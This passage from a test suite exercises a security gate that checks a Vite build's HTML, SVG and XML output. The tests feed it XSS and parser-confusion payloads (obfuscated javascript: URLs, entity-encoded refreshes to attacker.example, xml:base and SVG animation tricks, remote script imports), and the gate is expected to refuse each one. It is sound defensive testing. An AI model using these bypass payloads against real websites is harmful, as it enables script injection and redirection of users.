  throwsGate(() => scan(`<meta http-equiv="refresh" content="0; url='https://attacker.example'@document.invalid/site/">`), /text after its closing quote/);
  assert.deepEqual(scan(`<meta http-equiv="refresh" content="0; url='/site/x/'">`).refreshes, ["/site/x/"]);
  assert.deepEqual(scan('<meta http-equiv="refresh" content="0; url=/site/&amp;num;/../../other-app/">').refreshes, ["/site/&num;/../../other-app/"]); // decoded once
  throwsGate(() => scan('<a href="&Backslash;&Backslash;attacker.example/">x</a>'), /unsupported character reference &Backslash;/);
  throwsGate(() => scan('<p title="&copy; 2026">x</p>'), /unsupported character reference &copy;/);
  // XML Base re-roots relative URLs for a browser honouring it; this scanner resolves against the document.
  throwsGate(() => scan('<svg xml:base="https://attacker.example/"><rect/></svg>'), /xml:base/);
  throwsGate(() => scan('<svg xml:base="/other/"><rect/></svg>', { xml: true }), /xml:base/);
  // <use> clones referenced markup (handlers included) into the document: only a same-document fragment.
  throwsGate(() => scan('<svg><use href="/other-app/payload.svg#p"/></svg>'), /references another resource/);
  throwsGate(() => scan('<svg xmlns:xlink="http://www.w3.org/1999/xlink"><use xlink:href="other.svg#p"/></svg>', { xml: true }), /references another resource/);
  throwsGate(() => scan('<svg><use href="#a" xlink:href="#b"/></svg>'), /exactly one href/);
  throwsGate(() => scan("<svg><use/></svg>"), /exactly one href/);
  assert.equal(scan('<svg><use href="#icon"/><use xlink:href=" #icon2 "/></svg>').scripts.length, 0);
  assert.equal(scan('<link rel="stylesheet" href="https://fonts.example/css2?family=Inter&display=swap"><img alt="a &amp; b &lt; c" src="x.png">').scripts.length, 0);
  throwsGate(() => scan('<!-- <script src="/a.js"> --><script src="https://cdn.example.invalid/x.js"></script>'), /comment contains markup/);
  throwsGate(() => scan("<!-- a > b -->"), /comment contains markup/);
  throwsGate(() => scan("<!-- never closed"), /unterminated comment/);
  throwsGate(() => scan("<!ELEMENT br EMPTY>"), /unsupported declaration/);
  throwsGate(() => scan("<![CDATA[ x ]]>"), /CDATA/);
  throwsGate(() => scan('<?xml version="1.0"?><html></html>'), /processing instructions/);
  throwsGate(() => scan("<p>a < b</p>"), /does not start a tag/);
  throwsGate(() => scan("<script/>"), /self-closing/);
  throwsGate(() => scan("<style/>"), /self-closing/);
  throwsGate(() => scan('<script src="/a.js"'), /unterminated <script> tag/);
  throwsGate(() => scan("<script>no end"), /without <\/script>/);
  throwsGate(() => scan("<div"), /unterminated <div> tag/);
  throwsGate(() => scan("<script =x></script>"), /cannot parse attributes/);
  throwsGate(() => scan('<script src="/a.js" src="/b.js"></script>'), /repeated/);
  throwsGate(() => parseAttributes('a="1" a="2"', "t"), /repeated/);
  assert.deepEqual([...parseAttributes(` async defer src = "x.js" type='module' nomodule`, "t")], [["async", null], ["defer", null], ["src", "x.js"], ["type", "module"], ["nomodule", null]]);
  // Self-closing only from the attribute-name or after-quoted-value states; a "/" after an unquoted value is data.
  for (const [raw, selfClosing, attrs] of [["/", true, []], ["a=b/", false, [["a", "b/"]]], ["a=/", false, [["a", "/"]]], ['a="b"/', true, [["a", "b"]]], ["a='b'/", true, [["a", "b"]]], ["a/", true, [["a", null]]], ["a=b /", true, [["a", "b"]]], ["a=b c=/", false, [["a", "b"], ["c", "/"]]], [" a= b/", false, [["a", "b/"]]]]) {
    const parsed = parseStartTag(raw, "t");
    assert.deepEqual([parsed.selfClosing, [...parsed.attrs]], [selfClosing, attrs], JSON.stringify(raw));
  }
  throwsGate(() => parseStartTag("/ ", "t"), /cannot parse attributes/);
  for (const html of ['<iframe src="/x.html"></iframe>', '<iframe srcdoc="&lt;script&gt;x&lt;/script&gt;"></iframe>', "<object data='x.swf'></object>", "<embed src=x>", "<applet></applet>", '<base href="https://cdn.example.invalid/">', "<base/>", '<link rel="import" href="x.html">']) {
    throwsGate(() => scan(html), /refused/, html);
  }
  for (const html of ['<div onclick="x()"></div>', "<svg onload=x></svg>", '<body ONLOAD="x"></body>', '<img src=x onerror="x">']) {
    throwsGate(() => scan(html), /inline event handler/, html);
  }
  for (const href of ["javascript:alert(1)", "JAVASCRIPT:alert(1)", "&#106;avascript:alert(1)", "jav&#x09;ascript:alert(1)", "java\tscript:alert(1)", "&#x6A;&#x61;vascript&colon;alert(1)", "vbscript:x", "data:text/html;base64,PHNjcmlwdD4=", "data:application/javascript,alert(1)"]) {
    throwsGate(() => scan(`<a href="${href}">x</a>`), /executable URL scheme|data: URL that is not an image/, href);
  }
  assert.equal(scan('<img src="data:image/svg+xml,%3Csvg%3E"><link rel="icon" href="data:image/png;base64,AAAA">').scripts.length, 0);
  throwsGate(() => scan('<meta http-equiv="refresh" content="0">'), /without a "<seconds>; url=…" content/);
  throwsGate(() => scan("<svg><foreignObject><div>x</div></foreignObject></svg>", { xml: true }), /foreignObject/);
  // decodeDocument: valid UTF-8 only, no C0 control other than tab/LF/FF/CR (ESC drives ISO-2022-JP; FF FE is a UTF-16 BOM).
  assert.equal(decodeDocument(Buffer.from([0xef, 0xbb, 0xbf, 0x3c, 0x70, 0x3e, 0x09, 0x0a]), "t"), "<p>\t\n");
  throwsGate(() => decodeDocument(Buffer.from("<p>\x1b$B</p>"), "t"), /control character U\+001B/);
  throwsGate(() => decodeDocument(Buffer.from([0xff, 0xfe, 0x3c, 0x00]), "t"), /not valid UTF-8/);
  throwsGate(() => decodeDocument(Buffer.from([0x3c, 0xc3, 0x28]), "t"), /not valid UTF-8/);
  // Character references: numeric and modelled names decode (case-sensitive, as in a browser); a terminated
  // name this gate does not model is refused; an unterminated unknown name is literal, as in a browser.
  assert.equal(decodeEntities("&#106;ava&#x53;cript&colon;&amp;&lt;&quot;&AMP;&Tab;&bsol;&quest;&num;"), 'javaScript:&<"&\t\\?#');
  assert.equal(decodeEntities("https://fonts.example/css2?family=Inter&display=swap&weight"), "https://fonts.example/css2?family=Inter&display=swap&weight");
  throwsGate(() => decodeEntities("&unknown;"), /unsupported character reference &unknown;/);
  throwsGate(() => decodeEntities("&copy;"), /unsupported character reference &copy;/);
  throwsGate(() => decodeEntities("&TAB;"), /unsupported character reference &TAB;/); // not a name: only &Tab; is
  // Unterminated: only legacy names decode, and not before "=" or an alphanumeric; a value decodes exactly once.
  assert.equal(decodeEntities("a &amp b &ampx &amp=1 &lt&gt &nbsp;"), "a & b &ampx &amp=1 <>  "); // &nbsp; is U+00A0 exactly
  // A legacy name a browser decodes without a semicolon but the gate does not model is refused when the
  // browser would decode it ("&copy.js" → "©.js"); followed by an alphanumeric or "=" it is literal to both.
  throwsGate(() => decodeEntities("/site/assets/x&copy.js"), /unsupported character reference &copy /);
  assert.equal(decodeEntities("&copyx &copy=1 &notin"), "&copyx &copy=1 &notin");
  assert.equal(decodeEntities("/site/&num/../../other-app/payload.html"), "/site/&num/../../other-app/payload.html"); // "&num" is literal to a browser
  assert.equal(decodeEntities("/site/&amp;num;/../../x"), "/site/&num;/../../x"); // one pass: "&amp;" becomes "&", nothing re-decodes
  assert.equal(decodeEntities("&#38;#35;"), "&#35;");
  // Numeric references follow HTML's rules: zero, surrogates, values above U+10FFFF or too large to represent
  // become U+FFFD (so "&#x110000;" cannot pose as a literal "#" fragment start); 0x80–0x9F remap to windows-1252.
  assert.equal(decodeEntities("&#x110000;|&#0;|&#xD800;|&#99999999999999999999999;|&#x80;|&#65;|&#x26;"), "�|�|�|�|€|A|&");
  assert.equal(decodeEntities("/site/&#x110000;/../../other-app/payload.html"), "/site/�/../../other-app/payload.html");
  // refreshUrl(): the browser's declarative refresh steps; a quoted URL ends at its matching quote.
  assert.equal(refreshUrl("0; url=/site/x/", "t"), "/site/x/");
  assert.equal(refreshUrl(" 0 ;URL = \"/site/x/\"  ", "t"), "/site/x/");
  assert.equal(refreshUrl("0;url='https://attacker.example'", "t"), "https://attacker.example");
  throwsGate(() => refreshUrl("0; url='https://attacker.example'@document.invalid/site/", "t"), /text after its closing quote/);
  throwsGate(() => refreshUrl("0; url='/a", "t"), /unterminated quote/);
  throwsGate(() => refreshUrl("0; https://attacker.example/", "t"), /without a "<seconds>; url=…" content/); // the browser would navigate; not modelled, refused
  throwsGate(() => refreshUrl("0,url=/x", "t"), /without a "<seconds>; url=…" content/);
  throwsGate(() => refreshUrl("0.5;url=/x", "t"), /without a "<seconds>; url=…" content/);
});

test("HTML documents: known sources, pinned inline scripts, inert data blocks, bounded refresh and preload targets", () => {
  const dir = mkdtempSync(join(tmpdir(), "bundle-check-doc-"));
  try {
    const known = new Set(["assets/index-abc.js", "embed.js"]);
    const judge = (html, over = {}) => {
      writeFileSync(join(dir, "index.html"), html);
      return checkDocuments({ dir, files: ["index.html"], known, base: "/site/", trust, packages: ["picomatch"], ...over });
    };
    const ok = { documents: 1, inline: 1, data: 0, pinnedBySha256: 1, pinnedByPattern: 0 };
    assert.deepEqual(judge(`<script>${INLINE}</script><script type="module" src="/site/assets/index-abc.js"></script><script src="/site/embed.js"></script>`), ok);
    assert.deepEqual(judge("<script>window.location.replace('/site/start/which-project/' + window.location.search);</script>"), { ...ok, pinnedBySha256: 0, pinnedByPattern: 1 });
    assert.equal(judge(`<script>\n  ${INLINE}\n\n</script><script></script>`).inline, 1); // normalised body; empty inline ignored
    assert.deepEqual(judge('<script type="application/ld+json">{"@context":"https://schema.org"}</script>'), { ...ok, inline: 0, pinnedBySha256: 0, data: 1 });
    throwsGate(() => judge("<script>window.__t = 2</script>"), /inline script 1 is not pinned .*\(sha256 of its normalised body: [0-9a-f]{64}\)/);
    throwsGate(() => judge("<script>window.location.replace('/site/../other/' + window.location.search);</script>"), /not pinned/);
    throwsGate(() => judge("<script>window.location.replace('https://evil.example/' + window.location.search);</script>"), /not pinned/);
    throwsGate(() => judge("<script>/* picomatch */</script>"), /inline script 1 of index\.html mentions allowlisted package picomatch/);
    throwsGate(() => judge('<script type="application/json">{"dep":"picomatch"}</script>'), /data block 1 of index\.html mentions allowlisted package picomatch/);
    throwsGate(() => judge('<script type="importmap">{"imports":{}}</script>'), /import maps are refused/);
    throwsGate(() => judge('<script type="text/plain" src="/site/embed.js"></script>'), /non-script type/);
    throwsGate(() => judge('<script src="/site/embed.js">payload()</script>'), /must have an empty body/);
    throwsGate(() => judge('<script src="https://cdn.example.invalid/x.js"></script>'), /external script/);
    throwsGate(() => judge('<script src="//cdn.example.invalid/x.js"></script>'), /external script/);
    throwsGate(() => judge('<script data-src="/site/assets/index-abc.js" src="https://cdn.example.invalid/x.js"></script>'), /external script/);
    throwsGate(() => judge('<!-- <script src="/site/assets/index-abc.js"> --><script src="https://cdn.example.invalid/x.js"></script>'), /comment contains markup/);
    throwsGate(() => judge('<script src="/site/assets/missing.js"></script>'), /not a chunk of this build nor a pinned public copy/);
    throwsGate(() => judge('<script src=""></script>'), /empty src/);
    throwsGate(() => judge("<script src></script>"), /empty src/);
    throwsGate(() => judge('<head><base href="https://cdn.example.invalid/"></head><script src="/site/embed.js"></script>'), /<base> is refused/);
    throwsGate(() => judge('<link rel="modulepreload" href="https://cdn.example.invalid/x.js">'), /preloads an external script/);
    throwsGate(() => judge('<link rel="modulepreload" href="/site/assets/other.js">'), /preloads .* not a chunk/);
    assert.equal(judge('<link rel="modulepreload" href="/site/assets/index-abc.js"><script>' + INLINE + "</script>").inline, 1);
    assert.equal(judge('<meta http-equiv="refresh" content="0; url=/site/start/which-project/" /><script>' + INLINE + "</script>").inline, 1);
    throwsGate(() => judge('<meta http-equiv="refresh" content="0; url=/site/../other/">'), /outside the base/);
    throwsGate(() => judge('<meta http-equiv="refresh" content="0; url=/other/">'), /outside the base/);
    throwsGate(() => judge('<meta http-equiv="refresh" content="0; url=https://evil.example/">'), /outside this site/);
    throwsGate(() => judge('<meta http-equiv="refresh" content="0; url=&#106;avascript:x">'), /outside this site|executable URL scheme/);
    assert.equal(judge("<script src='./assets/index-abc.js?v=1'></script><script src=embed.js></script>", { base: "/" }).inline, 0);
    assert.equal(judge('<script src="/assets/index-abc.js"></script>', { base: "/" }).documents, 1);
    // URLs are read as the browser reads them: trimmed, tabs/newlines dropped, resolved against the document URL.
    throwsGate(() => judge('<script src=" https://attacker.example/../../site/assets/index-abc.js"></script>'), /external script/);
    throwsGate(() => judge('<script src="\\site\\assets\\index-abc.js"></script>'), /backslash/);
    throwsGate(() => judge('<script src="/site/assets/index%2dabc.js"></script>'), /percent-encoded local path/);
    assert.equal(judge('<script src="/site/assets/\tindex-abc.js"></script>').documents, 1);
    throwsGate(() => judge('<meta http-equiv="refresh" content="0; url=/site/%2e%2e/other/">'), /outside the base/);
    throwsGate(() => judge('<meta http-equiv="ref&#x72;esh" content="0; url=https://evil.example/">'), /outside this site/);
    // Script types are read entity-decoded, and every JavaScript MIME type is executable.
    throwsGate(() => judge('<script type="mod&#x75;le">import "https://attacker.example/p.js";</script>'), /inline script 1 is not pinned/);
    throwsGate(() => judge('<script type="text/javascript1.5">globalThis.pwned=1</script>'), /inline script 1 is not pinned/);
    throwsGate(() => judge('<script language="javascript">globalThis.pwned=1</script>'), /inline script 1 is not pinned/);
    throwsGate(() => judge('<script type="application/x-javascript">globalThis.pwned=1</script>'), /inline script 1 is not pinned/);
    // An empty or valueless `language` falls back to JavaScript (HTML Standard), so it is executable.
    throwsGate(() => judge('<script language="">import("https://attacker.example/matcher.js")</script>'), /inline script 1 is not pinned/);
    throwsGate(() => judge("<script language>import('https://attacker.example/matcher.js')</script>"), /inline script 1 is not pinned/);
    assert.equal(judge('<script language="vbscript">x</script>').data, 1);
    throwsGate(() => judge('<svg><script language="vbscript">x</script></svg>'), /inline script 1 is not pinned/); // SVG scripts ignore `language`
    assert.equal(judge('<svg><script type="text/plain">x</script></svg>').data, 1); // an explicit inert type stays inert
    throwsGate(() => judge('<svg><script type="module">x</script></svg>'), /inline script 1 is not pinned/);
    assert.equal(judge('<script type="text/template">{"dep":"react"}</script>').data, 1);
    throwsGate(() => judge('<script type="speculationrules">{"prerender":[{"source":"list","urls":["/other-app/payload.html"]}]}</script>'), /speculation rules are refused/);
    // "&bsol;" decodes to a backslash, so this refresh is a network URL to a browser; the decoded target is refused.
    throwsGate(() => judge('<meta http-equiv="refresh" content="0; url=&bsol;&bsol;attacker.example/payload.html">'), /contains whitespace, control characters or a backslash/);
    // Refresh targets: a quoted URL is cut at its quote (then trailing text is refused); "&num" stays literal and
    // "&amp;num;" decodes once to "&num;", so both traversals resolve outside the base, as in a browser.
    throwsGate(() => judge(`<meta http-equiv="refresh" content="0; url='https://attacker.example'@document.invalid/site/">`), /text after its closing quote/);
    throwsGate(() => judge(`<meta http-equiv="refresh" content="0; url='https://attacker.example'">`), /outside this site/);
    throwsGate(() => judge('<meta http-equiv="refresh" content="0; url=/site/&num/../../other-app/payload.html">'), /outside the base/);
    throwsGate(() => judge('<meta http-equiv="refresh" content="0; url=/site/&amp;num;/../../other-app/payload.html">'), /outside the base/);
    assert.equal(judge(`<meta http-equiv="refresh" content="0; url='/site/x/'">`).documents, 1);
    // An out-of-range numeric reference is U+FFFD to a browser, not a literal "#": the traversal is seen and refused.
    throwsGate(() => judge('<meta http-equiv="refresh" content="0; url=/site/&#x110000;/../../other-app/payload.html">'), /outside the base/);
    // A scripting-disabled browser parses <noscript> as markup and honours a refresh inside it.
    throwsGate(() => judge('<noscript><meta http-equiv="refresh" content="0; url=https://attacker.example/payload.html"></noscript>'), /outside this site/);
    assert.equal(judge("<noscript><p>Enable JavaScript to use this site.</p></noscript>").documents, 1);
    // The placeholder origin is not the site: any absolute or protocol-relative URL is external.
    throwsGate(() => judge('<meta http-equiv="refresh" content="0; url=https://document.invalid/site/">'), /outside this site/);
    throwsGate(() => judge('<script src="//document.invalid/site/embed.js"></script>'), /external script/);
    throwsGate(() => judge('<link rel="modulepreload" href="https://document.invalid/site/embed.js">'), /preloads an external script/);
    // "&nbsp;" is U+00A0 to a browser, which requests "index-abc.js%C2%A0", not the known chunk; and xml:base
    // would make a browser fetch a known-looking path from another origin.
    throwsGate(() => judge('<script src="/site/assets/index-abc.js&nbsp;"></script>'), /percent-encoded local path/);
    throwsGate(() => judge('<svg xml:base="https://attacker.example/" xmlns:xlink="http://www.w3.org/1999/xlink"><script xlink:href="/site/assets/index-abc.js"/></svg>'), /xml:base/);
    // DEL is kept (percent-encoded) by a browser, so it is never trimmed into a match with the known chunk.
    throwsGate(() => judge('<script src="/site/assets/index-abc.js&#127;"></script>'), /contains whitespace, control characters or a backslash/);
    // <use> clones referenced markup, handlers included: only a same-document fragment is allowed.
    throwsGate(() => judge('<svg><use href="/other-app/payload.svg#p"/></svg>'), /references another resource/);
    assert.equal(judge('<svg><defs><g id="icon"/></defs><use href="#icon"/></svg>').documents, 1);
    // Tokenizer states and SVG sources.
    throwsGate(() => judge('<noscript><script type="application/json"></noscript><script>globalThis.pwned=1</script>'), /<noscript>: <script> without <\/script>/); // the body is judged as markup too
    throwsGate(() => judge('<style></stylex><script type="application/json"></style><script>globalThis.pwned=1</script>'), /inline script 1 is not pinned/);
    throwsGate(() => judge('<script! type="application/json"><script>globalThis.pwned=1</script>'), /unsupported tag name/);
    throwsGate(() => judge('<svg xmlns:xlink="http://www.w3.org/1999/xlink"><script xlink:href="https://attacker.example/p.js"></script></svg>'), /external script/);
    throwsGate(() => judge('<svg><script href="https://attacker.example/p.js"></script></svg>'), /external script/);
    throwsGate(() => judge('<script src="/site/embed.js" href="/site/embed.js"></script>'), /several source attributes/);
    throwsGate(() => judge('<svg><a href="https://example.invalid/"><animate attributeName="href" values="https://example.invalid/;javascript:alert(1)" dur="1s" fill="freeze"/></a></svg>'), /SVG animation element/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("every output file is a hash-checked chunk, a pinned tracked public script, a judged document or inert data", () => {
  const dir = mkdtempSync(join(tmpdir(), "bundle-check-out-"));
  try {
    const outDir = join(dir, "dist");
    const publicDir = join(dir, "public");
    mkdirSync(join(outDir, "assets"), { recursive: true });
    mkdirSync(publicDir);
    const put = (rel, content) => writeFileSync(join(outDir, rel), content);
    // Like the docs site's hand-authored diagrams: XML declaration, <title>, <desc>, a CSS <style>, a comment.
    const CLEAN_SVG = '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><title>Logo</title><desc>d</desc><style>.a{fill:#000}</style><!-- shape --><path class="a" d="M0 0h1"/></svg>';
    put("assets/index-abc.js", "console.log(1)");
    put("assets/index-abc.css", "body{}");
    put("assets/data.bin", "binary chunk");
    put("embed.js", EMBED);
    writeFileSync(join(publicDir, "embed.js"), EMBED);
    put("index.html", `<!doctype html><html><head><script>${INLINE}</script></head><body><script type="module" src="/site/assets/index-abc.js"></script><script src="/site/embed.js"></script></body></html>`);
    put("logo.svg", CLEAN_SVG);
    put("robots.txt", "User-agent: *\n");
    put("favicon.ico", Buffer.from([0, 0, 1, 0]));
    const chunkHashes = new Map([["assets/index-abc.js", sha256("console.log(1)")], ["assets/data.bin", sha256("binary chunk")]]);
    const check = (over = {}) => judgeOutput({ dir: outDir, chunkHashes, trust, publicDir, base: "/site/", packages: ["picomatch"], isTracked: () => true, ...over });
    const ok = check();
    assert.deepEqual([ok.files, ok.scripts, ok.publicCopies, ok.documents, ok.inline, ok.pinnedBySha256], [8, 3, ["embed.js"], 1, 1, 1]);
    // Chunks are reconciled by hash whatever their extension.
    put("assets/index-abc.js", "console.log(1);/* appended */");
    throwsGate(() => check(), /index-abc\.js differs from the chunk Rollup wrote/);
    put("assets/index-abc.js", "console.log(1)");
    put("assets/data.bin", "binary chunk altered");
    throwsGate(() => check(), /data\.bin differs from the chunk Rollup wrote/);
    put("assets/data.bin", "binary chunk");
    // Public copies: pin, byte identity with publicDir, git tracking.
    put("embed.js", `${EMBED}// changed\n`);
    writeFileSync(join(publicDir, "embed.js"), `${EMBED}// changed\n`);
    throwsGate(() => check(), /does not match its pin/);
    put("embed.js", EMBED);
    throwsGate(() => check(), /not a byte-identical copy/);
    writeFileSync(join(publicDir, "embed.js"), EMBED);
    throwsGate(() => check({ publicDir: null }), /no publicDir/);
    throwsGate(() => check({ isTracked: () => false }), /git does not track/);
    assert.equal(gitTracked(join(publicDir, "embed.js")), false); // a temp dir is not a git repository
    // Unexplained scripts and opaque payloads fail; the script message carries the hash needed to pin it.
    put("assets/vendor.mjs", "/* vendored */");
    throwsGate(() => check(), /vendor\.mjs is a script that is not a chunk of this build and not pinned .* \(sha256 [0-9a-f]{64}\)/);
    rmSync(join(outDir, "assets", "vendor.mjs"));
    put("assets/payload", "anything");
    throwsGate(() => check(), /payload is neither a chunk of this build nor of a recognised inert type/);
    rmSync(join(outDir, "assets", "payload"));
    put("assets/module.wasm", "\0asm");
    throwsGate(() => check(), /module\.wasm is neither a chunk/);
    rmSync(join(outDir, "assets", "module.wasm"));
    put("assets/guide.pdf", "%PDF-1.4\n1 0 obj << /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >> endobj\n");
    throwsGate(() => check(), /guide\.pdf is neither a chunk/); // a PDF can carry JavaScript: not inert
    rmSync(join(outDir, "assets", "guide.pdf"));
    // Inert text and SVG documents are tripwire-scanned; SVG may carry no script or handler.
    put("robots.txt", "# built with picomatch\n");
    throwsGate(() => check(), /robots\.txt mentions allowlisted package picomatch/);
    put("robots.txt", "User-agent: *\n");
    put("logo.svg", '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>');
    throwsGate(() => check(), /logo\.svg is an XML document carrying a <script>/);
    put("logo.svg", CLEAN_SVG);
    // Any XML file is judged as a document a browser may render: XHTML/SVG script, DTDs and stylesheet PIs fail.
    put("sitemap.xml", '<?xml version="1.0" encoding="UTF-8"?>\n<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"><url><loc>https://example.invalid/</loc></url></urlset>\n');
    assert.equal(check().files, 9);
    put("feed.xml", '<html xmlns="http://www.w3.org/1999/xhtml"><body><script src="https://attacker.example/matcher.js"></script></body></html>');
    throwsGate(() => check(), /feed\.xml is an XML document carrying a <script>/);
    put("feed.xml", '<?xml version="1.0"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "x.dtd"><svg/>');
    throwsGate(() => check(), /unsupported declaration/);
    put("feed.xml", '<?xml version="1.0"?><?xml-stylesheet href="x.xsl" type="text/xsl"?><feed/>');
    throwsGate(() => check(), /processing instructions/);
    put("feed.xml", '<?xml version="1.0" encoding="ISO-2022-JP"?><feed/>');
    throwsGate(() => check(), /XML declaration encoding/);
    rmSync(join(outDir, "feed.xml"));
    // XHTML is XML: an XML parser does not hide child markup inside <style>, so the script would run.
    put("payload.xhtml", '<html xmlns="http://www.w3.org/1999/xhtml"><body><style><script src="https://attacker.example/matcher.js"></script></style></body></html>');
    throwsGate(() => check(), /payload\.xhtml is an XML document carrying a <script>/);
    // An XHTML document may not navigate or preload on its own either.
    put("payload.xhtml", '<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="refresh" content="0; url=https://attacker.example/payload.html"/></head><body/></html>');
    throwsGate(() => check(), /payload\.xhtml is an XML document with a <meta http-equiv="refresh">/);
    put("payload.xhtml", '<html xmlns="http://www.w3.org/1999/xhtml"><head><link rel="modulepreload" href="/site/assets/index-abc.js"/></head><body/></html>');
    throwsGate(() => check(), /payload\.xhtml is an XML document with a script preload/);
    rmSync(join(outDir, "payload.xhtml"));
    // Documents are read as UTF-8 and may declare nothing else; ESC bytes (ISO-2022-JP shifts) and UTF-16 fail.
    put("jp.html", "<!doctype html><meta charset=iso-2022-jp><style></style>");
    throwsGate(() => check(), /declares the charset "iso-2022-jp"/);
    put("jp.html", Buffer.from("<!doctype html><p>\x1b$B</p>"));
    throwsGate(() => check(), /control character U\+001B/);
    put("jp.html", Buffer.from([0xff, 0xfe, 0x3c, 0x00, 0x70, 0x00, 0x3e, 0x00]));
    throwsGate(() => check(), /not valid UTF-8/);
    rmSync(join(outDir, "jp.html"));
    rmSync(join(outDir, "sitemap.xml"));
    put("logo.svg", '<svg xmlns="http://www.w3.org/2000/svg" onload="x()"></svg>');
    throwsGate(() => check(), /inline event handler/);
    put("logo.svg", '<svg xmlns="http://www.w3.org/2000/svg"><a href="javascript:x"></a></svg>');
    throwsGate(() => check(), /executable URL scheme/);
    put("logo.svg", '<svg xmlns:s="http://www.w3.org/2000/svg"><s:script>globalThis.pwned=1</s:script></svg>');
    throwsGate(() => check(), /qualified element name/);
    put("logo.svg", '<svg xmlns="http://www.w3.org/2000/svg"><a href="https://example.invalid/"><animate attributeName="href" values="https://example.invalid/;javascript:alert(1)" dur="1s" fill="freeze"/></a></svg>');
    throwsGate(() => check(), /SVG animation element/);
    put("logo.svg", '<?xml-stylesheet href="x.css"?><svg xmlns="http://www.w3.org/2000/svg"></svg>');
    throwsGate(() => check(), /processing instructions/);
    put("logo.svg", '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><use xlink:href="other.svg#p"/></svg>');
    throwsGate(() => check(), /references another resource/);
    put("logo.svg", CLEAN_SVG);
    // Pinned public text that names the package by word still fails; non-word matches do not.
    const vendored = "// bundled copy of picomatch 4.0.7\n";
    const trustVendored = parseBundleTrust({ allow: [], bundle: { firstPartyScripts: [{ project: ".", public: "embed.js", sha256: sha256(vendored), reason: REASON }, { project: ".", inline: "sha256", sha256: sha256(INLINE), reason: REASON }] } }, ".");
    put("embed.js", vendored);
    writeFileSync(join(publicDir, "embed.js"), vendored);
    throwsGate(() => check({ trust: trustVendored }), /public copy embed\.js mentions allowlisted package picomatch/);
    put("embed.js", EMBED);
    writeFileSync(join(publicDir, "embed.js"), EMBED);
    assert.throws(() => tripwire("x", "import('@scope/name')", ["@scope/name"]), GateError);
    tripwire("x", "scope/name @scope/named @scope/name.js mypicomatchlib", ["@scope/name", "picomatch"]);
    // Symlinks anywhere in the output fail closed.
    symlinkSync(join(outDir, "assets", "index-abc.js"), join(outDir, "assets", "link.js"));
    throwsGate(() => check(), /symlink/);
    throwsGate(() => walkOutput(outDir), /symlink/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("CLI arguments: --out is required and must lie outside the project; the project must be a git repository", async () => {
  throwsGate(() => parseArgs([]), /--out/);
  throwsGate(() => parseArgs(["--out"]), /bad argument/);
  throwsGate(() => parseArgs(["--out", "x", "--bogus", "1"]), /bad argument/);
  assert.equal(parseArgs(["--out", "x", "--project", "p", "--first-party-root", "r", "--verify-dist", "d"])["verify-dist"], "d");
  const dir = mkdtempSync(join(tmpdir(), "bundle-check-cli-"));
  try {
    const app = join(dir, "app");
    mkdirSync(app);
    writeFileSync(join(dir, "allow.json"), JSON.stringify(ALLOW_DOC));
    writeFileSync(join(app, "package.json"), "{}");
    const argv = (out, ...extra) => ["--out", out, "--project", app, "--allowlist", join(dir, "allow.json"), ...extra];
    await rejectsGate(main(argv(join(app, "dist")), silent), /must be outside the project/);
    await rejectsGate(main(argv(join(app, "dist", "nested")), silent), /must be outside the project/);
    await rejectsGate(main(argv(join(dir, "out")), silent), /not inside a git repository/);
    assert.equal(spawnSync("git", ["init", "-q"], { cwd: app }).status, 0);
    assert.equal(projectKey(app), ".");
    await rejectsGate(main(argv(join(dir, "out"), "--now", "2027-01-01T00:00:00Z"), silent), /expired at/);
    await rejectsGate(main(argv(join(dir, "out")), silent), /vite is not installed/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

/** A project with Vite installed to run the real-build cases against: BUNDLE_CHECK_VITE_PROJECT or the cwd. */
function viteProject() {
  const projectDir = resolve(process.env.BUNDLE_CHECK_VITE_PROJECT || process.cwd());
  const { entry } = resolveVite(projectDir); // GateError (test failure) when Vite is absent
  const require = createRequire(join(projectDir, "package.json"));
  for (const name of ["react", "picomatch"]) require.resolve(name); // throws when the project lacks them
  return { entry, nodeModules: join(projectDir, "node_modules") };
}

/**
 * Write a minimal Vite project (its own git repository) whose entry imports the given bare specifiers.
 * Its node_modules is a symlink to the Vite project's (or, with farm: true, a directory of symlinks to
 * each installed package so extra packages can be added), so Vite, react and picomatch resolve exactly
 * as in a real install (Rollup records their real paths, which is what the gate classifies).
 */
function miniProject(dir, nodeModules, imports, { publicScript = true, inline = INLINE, farm = false, config = null } = {}) {
  mkdirSync(join(dir, "src"), { recursive: true });
  if (farm) {
    mkdirSync(join(dir, "node_modules"));
    for (const entry of readdirSync(nodeModules, { withFileTypes: true })) {
      // Packages only: dot entries (.bin, .vite, npm's hidden .package-lock.json) are not linked, so a test
      // that writes its own lockfile into the farm never writes through a link into the real install.
      if (entry.name.startsWith(".")) continue;
      symlinkSync(join(nodeModules, entry.name), join(dir, "node_modules", entry.name), entry.isDirectory() ? "dir" : "file");
    }
  } else symlinkSync(nodeModules, join(dir, "node_modules"), "dir");
  writeFileSync(join(dir, "package.json"), JSON.stringify({ name: "mini", private: true, type: "module" }));
  if (config) writeFileSync(join(dir, "vite.config.js"), config);
  writeFileSync(
    join(dir, "index.html"),
    `<!doctype html><html><head><script>${inline}</script></head><body><div id="root"></div>` +
      (publicScript ? '<script src="/embed.js"></script>' : "") +
      '<script type="module" src="/src/main.js"></script></body></html>',
  );
  const lines = imports.map((file, index) => `import * as m${index} from ${JSON.stringify(file)};`);
  lines.push(`document.getElementById("root").textContent = [${imports.map((_, index) => `typeof m${index}`).join(", ")}].join(" ");`);
  writeFileSync(join(dir, "src", "main.js"), `${lines.join("\n")}\n`);
  const git = (...args) => {
    const result = spawnSync("git", args, { cwd: dir, encoding: "utf8" });
    assert.equal(result.status, 0, `git ${args.join(" ")}: ${result.stderr}`);
  };
  git("init", "-q");
  if (publicScript) {
    mkdirSync(join(dir, "public"));
    writeFileSync(join(dir, "public", "embed.js"), EMBED);
    git("add", "--", "public/embed.js"); // a public copy must be tracked to count as repository-authored
  }
}

/** Add web workers to a mini project: each { file, imports, inline } becomes an import of `${file}?worker[&inline]`. */
